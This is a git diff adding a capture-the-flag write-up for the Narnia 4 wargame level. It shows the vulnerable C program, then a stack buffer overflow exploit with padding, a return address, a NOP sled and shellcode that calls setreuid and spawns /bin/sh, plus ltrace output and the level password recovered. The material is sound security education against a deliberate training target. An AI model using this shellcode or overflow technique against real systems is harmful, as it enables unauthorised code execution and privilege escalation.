@@ -348,3 +348,70 @@ aKNxxrpDc1
 
 ![Get Shell - Narnia 3](assets/narnia3.png)
 
+## Narnia 4
+
+As usual, we can find the source code of narnia 4 in `/narnia/narnia4.c`.
+
+```c
+#include <string.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <ctype.h>
+
+extern char **environ;
+
+int main(int argc,char **argv){
+    int i;
+    char buffer[256];
+
+    for(i = 0; environ[i] != NULL; i++)
+        memset(environ[i], '\0', strlen(environ[i]));
+
+    if(argc>1)
+        strcpy(buffer,argv[1]);
+
+    return 0;
+}
+```
+
+And this is another typical stack overflow issue which would allows attackers
+to take control of the program.
+
+So we first fill in 256 bytes, and then it will overwrite variable `i`, 
+(256:256+4), `%ebp` (256+4:256+8) and `%eip` (256+8:256+12). Therefore, we
+should pass 256+8=264 `A` first, and then pass in the address where we'd like
+it to jump to.
+
+> And thanks to shinohara-rin for teaching me how to use ltrace! Using ltrace we
+> can trace all function calls to libc.
+
+Let's test it with 264 `A`s + `0xdeadbeef` + nop sled + shellcode 
+(`setreuid(0,0)` + `sh`) first.
+
+```bash
+$ ltrace /narnia/narnia4 `echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6a\x31\x58\xcd\x80\x89\xc3\x6a\x46\x58\x89\xd9\xcd\x80\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80'`
+__libc_start_main(0x8049196, 2, 0xffffd4b4, 0 <unfinished ...>
+strlen("SHELL=/bin/bash")                        = 15
+memset(0xffffd719, '\0', 15)                     = 0xffffd719
+strlen("PWD=/home/narnia4")                      = 17
+...
+memset(0xffffdfc2, '\0', 19)                     = 0xffffdfc2
+strlen("_=/usr/bin/ltrace")                      = 17
+memset(0xffffdfd6, '\0', 17)                     = 0xffffdfd6
+strcpy(0xffffd234, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...) = 0xffffd2f4
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+```
+
+And we can see that in my trial, `buffer` begins at `0xffffd234`. So now we can
+modify the address to `0xffffd234+264 = 0xffffd33c` and we round it
+up to `0xffffd340`
+
+
+```bash
+$ /narnia/narnia4 `echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x40\xd3\xff\xff\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6a\x31\x58\xcd\x80\x89\xc3\x6a\x46\x58\x89\xd9\xcd\x80\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80'`
+$ cat /etc/narnia_pass/narnia5
+1oCoEkRJSB
+```
+
+![Get Shell - Narnia 4](assets/narnia4.png)
